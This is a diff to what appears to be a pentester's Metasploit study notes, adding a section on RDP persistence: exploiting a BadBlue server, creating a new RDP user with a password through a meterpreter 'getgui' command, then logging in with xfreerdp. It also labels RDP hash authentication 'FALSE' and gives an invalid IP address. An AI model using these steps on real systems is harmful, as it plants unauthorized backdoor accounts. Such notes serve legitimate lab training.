@@ -730,12 +730,20 @@ msf6> use multi/handler
     > set payload
     > run
 __________________________________________________________________________________________________________________________________
+Persistence via RDP
+------------------
+In addition to using cleartext passwords for authentication with RDP, we can also utilize user account hashes. (FALSE)
 
-    
-    
+You already need to have administrative session (e.g. Badblue)
+msf6 > search badblue
+     >.......
+     > exploit
 
+Create RDP user account and password through meterpreter shell
 
+meterpreter > rdp getgui -e -u alex -p LEEbl_1234
 
-
+KIll the session and connect with xfreerdp
+#xfreerdp /u:alex /p:LEEbl_1234 /v:10.10.444.2 
 
 __________________________________________________________________________________________________________________________________
